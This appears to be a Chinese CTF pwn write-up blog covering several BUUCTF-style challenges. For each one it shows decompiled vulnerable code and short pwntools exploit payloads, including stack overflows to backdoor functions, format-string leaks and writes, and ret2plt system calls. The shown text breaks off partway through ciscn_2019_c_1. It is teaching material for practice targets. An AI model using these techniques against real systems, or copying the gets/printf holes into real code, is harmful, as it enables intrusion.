class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char s[<span class="hljs-number">15</span>]; // [rsp+1h] [rbp-Fh] BYREF<br><br>  puts(<span class="hljs-string">&quot;please input&quot;</span>);<br>  gets(s, argv);<br>  puts(s);<br>  puts(<span class="hljs-string">&quot;ok,bye!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-built_in">int</span> fun()<br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xf</span>+<span class="hljs-number">8</span>) + p64(elf.sym[<span class="hljs-string">&#x27;fun&#x27;</span>]+<span class="hljs-number">1</span>)<br><span class="hljs-comment">## 等价于 payload = b&#x27;a&#x27;*(0xf+8) + p64(0x401186+1)</span><br></code></pre></td></tr></table></figure><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a><font style="color:rgb(33, 37, 41);">warmup_csaw_2016</font></h1><blockquote><p>考点</p><ul><li>后门+64位栈溢出</li><li>数据获取</li><li>重复利用函数</li><li>栈平衡</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">__int64 __fastcall main(<span class="hljs-built_in">int</span> a1, char **a2, char **a3)<br>&#123;<br>  char s[<span class="hljs-number">64</span>]; // [rsp+0h] [rbp-80h] BYREF<br>  _BYTE v5[<span class="hljs-number">64</span>]; // [rsp+40h] [rbp-40h] BYREF<br><br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;-Warm Up-\n&quot;</span>, 0xAuLL);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;WOW:&quot;</span>, 4uLL);<br>  sprintf(s, <span class="hljs-string">&quot;%p\n&quot;</span>, sub_40060D);<br>  write(<span class="hljs-number">1</span>, s, 9uLL);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, 1uLL);<br>  <span class="hljs-keyword">return</span> gets(v5);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x040061D</span>+<span class="hljs-number">1</span>)<br><span class="hljs-comment">## 等价于 payload = b&#x27;a&#x27;*(0x40+8) + p(elf.sym[&#x27;main&#x27;]+1)，但是这个程序没有静态符号，导致无法使用这个代码</span><br>sendlineafter(<span class="hljs-string">&#x27;WOW:&#x27;</span>,payload)<br>backdoor = <span class="hljs-built_in">int</span>(recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>log.success(<span class="hljs-built_in">hex</span>(backdoor))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(backdoor+<span class="hljs-number">1</span>)<br>sendline(payload)<br><br><span class="hljs-comment"># 数据提取有很多中方式</span><br><span class="hljs-comment">## 通过sendlineafter接受到指定字符串后发送，那么到指定字符串前所有无用字符都会被过滤掉</span><br><span class="hljs-comment">## 通过recvuntil(str)抛弃指定str（包括str）之前的所有字符，实现效果是一样的</span><br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_n_1</font></h1><blockquote><p>两种解法</p><ul><li>直接栈溢出到shell上</li><li>完成判断语句</li></ul></blockquote><blockquote><p>考点</p><ul><li>栈溢出</li><li>小数转换</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> func()<br>&#123;<br>  _BYTE v1[<span class="hljs-number">44</span>]; // [rsp+0h] [rbp-30h] BYREF<br>  <span class="hljs-built_in">float</span> v2; // [rsp+2Ch] [rbp-4h]<br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  puts(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 溢出到shell上</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x004006BE</span>)<br><br><span class="hljs-comment">## 完成判断语句 struct.pack(&#x27;&gt;f&#x27;, 11.28125).hex()</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>) + p32(<span class="hljs-number">0x41348000</span>)<br></code></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a><font style="color:rgb(33, 37, 41);">pwn1_sctf_2016</font></h1><blockquote><p>考点</p><ul><li>栈溢出+后门<ul><li>程序指定栈溢出规则（一个字符替换成三个字符）</li></ul></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> vuln()<br>&#123;<br>  const char *src; // eax<br>  char s[<span class="hljs-number">32</span>]; // [esp+1Ch] [ebp-3Ch] BYREF<br>  _BYTE v3[<span class="hljs-number">4</span>]; // [esp+3Ch] [ebp-1Ch] BYREF<br>  _BYTE v4[<span class="hljs-number">7</span>]; // [esp+40h] [ebp-18h] BYREF<br>  char v5; // [esp+47h] [ebp-11h] BYREF<br>  _BYTE v6[<span class="hljs-number">7</span>]; // [esp+48h] [ebp-10h] BYREF<br>  _BYTE v7[<span class="hljs-number">5</span>]; // [esp+4Fh] [ebp-9h] BYREF<br><br>  printf(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  fgets(s, <span class="hljs-number">0x20</span>, edata);<br>  std::string::operator=(&amp;<span class="hljs-built_in">input</span>, s);<br>  std::allocator&lt;char&gt;::allocator(&amp;v5);<br>  std::string::string(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;char&gt;::allocator(v7);<br>  std::string::string(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  (replace)(v3);<br>  std::string::operator=(&amp;<span class="hljs-built_in">input</span>, v3, v6, v4);<br>  std::string::~string(v3);<br>  std::string::~string(v6);<br>  std::allocator&lt;char&gt;::~allocator(v7);<br>  std::string::~string(v4);<br>  std::allocator&lt;char&gt;::~allocator(&amp;v5);<br>  src = std::string::c_str(&amp;<span class="hljs-built_in">input</span>);<br>  strcpy(s, src);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;I&#x27;</span>*<span class="hljs-number">20</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + p32(elf.sym[<span class="hljs-string">&#x27;get_flag&#x27;</span>])<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a><font style="color:rgb(33, 37, 41);">jarvisoj_level0</font></h1><blockquote><p>考点</p><ul><li>后门+64位栈溢出</li><li>栈平衡</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, 0xDuLL);<br>  <span class="hljs-keyword">return</span> vulnerable_function(1LL);<br>&#125;<br><br><br>ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">128</span>]; // [rsp+0h] [rbp-80h] BYREF<br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x200uLL);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span> + p64(elf.sym[<span class="hljs-string">&#x27;callsystem&#x27;</span>]+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a><font style="color:rgb(33, 37, 41);">[第五空间2019 决赛]PWN5</font></h1><blockquote><p>考点</p><ul><li>fmt<ul><li>泄露数据+获取数据</li><li>修改任意地址数据</li></ul></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> a1)<br>&#123;<br>  time_t seed; // eax<br>  <span class="hljs-built_in">int</span> result; // eax<br>  <span class="hljs-built_in">int</span> fd; // [esp+0h] [ebp-84h]<br>  char nptr[<span class="hljs-number">16</span>]; // [esp+4h] [ebp-80h] BYREF<br>  char buf[<span class="hljs-number">100</span>]; // [esp+14h] [ebp-70h] BYREF<br>  unsigned <span class="hljs-built_in">int</span> v6; // [esp+78h] [ebp-Ch]<br>  <span class="hljs-built_in">int</span> *v7; // [esp+7Ch] [ebp-8h]<br><br>  v7 = &amp;a1;<br>  v6 = __readgsdword(0x14u);<br>  setvbuf(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  seed = time(<span class="hljs-number">0</span>);<br>  srand(seed);<br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  read(fd, &amp;buf_, 4u);<br>  printf(<span class="hljs-string">&quot;your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, 0x63u);<br>  printf(<span class="hljs-string">&quot;Hello,&quot;</span>);<br>  printf(buf);<br>  printf(<span class="hljs-string">&quot;your passwd:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, nptr, 0xFu);<br>  <span class="hljs-keyword">if</span> ( atoi(nptr) == buf_ )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;ok!!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    puts(<span class="hljs-string">&quot;fail&quot;</span>);<br>  &#125;<br>  result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( __readgsdword(0x14u) != v6 )<br>    sub_80493D0();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><br><span class="hljs-comment">## leak_pwd</span><br>payload = <span class="hljs-string">b&#x27;%12$saaa&#x27;</span>+p32(<span class="hljs-number">0x0804C044</span>) <br><span class="hljs-comment">## 等价于payload = b&#x27;%12$saaa&#x27;+p32(elf.sym[&#x27;buf_&#x27;])</span><br>sendline(payload)<br>recvuntil(<span class="hljs-string">&#x27;Hello,&#x27;</span>)<br>pwd = u32(recv(<span class="hljs-number">4</span>))<br><br>sendlineafter(<span class="hljs-string">&#x27;your passwd:&#x27;</span>,<span class="hljs-built_in">str</span>(pwd))<br><br><br><span class="hljs-comment">## modify pwd</span><br>payload = fmtstr_payload(<span class="hljs-number">10</span>,&#123;<span class="hljs-number">0x0804C044</span>:<span class="hljs-number">1</span>&#125;)<br><span class="hljs-comment">## 等价于payload = b&#x27;%c%12$na&#x27;+p32(0x0804C044)</span><br>sendline(payload)<br>sendlineafter(<span class="hljs-string">&#x27;your passwd:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a><font style="color:rgb(33, 37, 41);">jarvisoj_level2</font></h1><blockquote><p>考点</p><ul><li>32位栈溢出（无后门）</li><li>函数参数调整</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  vulnerable_function();<br>  system(<span class="hljs-string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br>ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">136</span>]; // [esp+0h] [ebp-88h] BYREF<br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x100u);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span> + p32(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]) + p32(<span class="hljs-number">0</span>) + p32(elf.sym[<span class="hljs-string">&#x27;hint&#x27;</span>]) <br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_n_8</font></h1><blockquote><p>考点</p><ul><li>地址+数据类型</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> v4; // [esp-14h] [ebp-20h]<br>  <span class="hljs-built_in">int</span> v5; // [esp-10h] [ebp-1Ch]<br><br>  var[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  var[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  init();<br>  puts(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, var, v4, v5);<br>  <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] == 17LL )<br>      system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      printf(<br>        <span class="hljs-string">&quot;something wrong! val is %d&quot;</span>,<br>        var[<span class="hljs-number">0</span>],<br>        var[<span class="hljs-number">1</span>],<br>        var[<span class="hljs-number">2</span>],<br>        var[<span class="hljs-number">3</span>],<br>        var[<span class="hljs-number">4</span>],<br>        var[<span class="hljs-number">5</span>],<br>        var[<span class="hljs-number">6</span>],<br>        var[<span class="hljs-number">7</span>],<br>        var[<span class="hljs-number">8</span>],<br>        var[<span class="hljs-number">9</span>],<br>        var[<span class="hljs-number">10</span>],<br>        var[<span class="hljs-number">11</span>],<br>        var[<span class="hljs-number">12</span>],<br>        var[<span class="hljs-number">13</span>],<br>        var[<span class="hljs-number">14</span>]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printf(<span class="hljs-string">&quot;%s, Welcome!\n&quot;</span>, var);<br>    puts(<span class="hljs-string">&quot;Try do something~&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 将var[13] == \x17即可</span><br>payload = p32(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a><font style="color:rgb(33, 37, 41);">bjdctf_2020_babystack</font></h1><blockquote><p>考点</p><ul><li>栈溢出</li><li>栈平衡</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  _BYTE buf[<span class="hljs-number">12</span>]; // [rsp+0h] [rbp-10h] BYREF<br>  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF<br><br>  setvbuf(stdout, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  setvbuf(stdin, 0LL, <span class="hljs-number">1</span>, 0LL);<br>  LODWORD(nbytes) = <span class="hljs-number">0</span>;<br>  puts(<span class="hljs-string">&quot;**********************************&quot;</span>);<br>  puts(<span class="hljs-string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;* And Welcome to the bin world!  *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;* Please told me u answer loudly!*&quot;</span>);<br>  puts(<span class="hljs-string">&quot;[+]Are u ready?&quot;</span>);<br>  puts(<span class="hljs-string">&quot;[+]Please input the length of your name:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nbytes);<br>  puts(<span class="hljs-string">&quot;[+]What&#x27;s u name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, (unsigned <span class="hljs-built_in">int</span>)nbytes);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 保证能够溢出到返回地址即可</span><br>sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(elf.sym[<span class="hljs-string">&#x27;backdoor&#x27;</span>]+<span class="hljs-number">1</span>)<br>sendline(payload)<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_c_1</font></h1><blockquote><p>考点</p><ul><li>栈溢出</li><li>编码</li><li>strlen绕过</li><li>Ret2libc</li><li>ROPgadget&#x2F;ROPgadget获取</li><li>函数参数调整</li><li>数据获取</li><li>函数的重复利用</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> encrypt()<br>&#123;<br>  size_t x; // rbx<br>  char s[<span class="hljs-number">48</span>]; // [rsp+0h] [rbp-50h] BYREF<br>  __int16 v3; // [rsp+30h] [rbp-20h]<br><br>  memset(s, <span class="hljs-number">0</span>, sizeof(s));<br>  v3 = <span class="hljs-number">0</span>;<br>  puts(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    x = (unsigned <span class="hljs-built_in">int</span>)x;<br>    <span class="hljs-keyword">if</span> ( x &gt;= strlen(s) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">96</span> || s[x] &gt; <span class="hljs-number">122</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">64</span> || s[x] &gt; <span class="hljs-number">90</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( s[x] &gt; <span class="hljs-number">47</span> &amp;&amp; s[x] &lt;= <span class="hljs-number">57</span> )<br>          s[x] ^= 0xFu;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        s[x] ^= 0xEu;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      s[x] ^= 0xDu;<br>    &#125;<br>    ++x;<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Ciphertext&quot;</span>);<br>  <span class="hljs-keyword">return</span> puts(s);<br>&#125;<br><br><br><span class="hljs-built_in">int</span> begin()<br>&#123;<br>  puts(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  puts(<span class="hljs-string">&quot;1.Encrypt&quot;</span>);<br>  puts(<span class="hljs-string">&quot;2.Decrypt&quot;</span>);<br>  puts(<span class="hljs-string">&quot;3.Exit&quot;</span>);<br>  <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Input your choice!&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> n2; // [rsp+Ch] [rbp-4h] BYREF<br><br>  init(argc, argv, envp);<br>  puts(<span class="hljs-string">&quot;EEEEEEE                            hh      iii                &quot;</span>);<br>  puts(<span class="hljs-string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);<br>  puts(<span class="hljs-string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     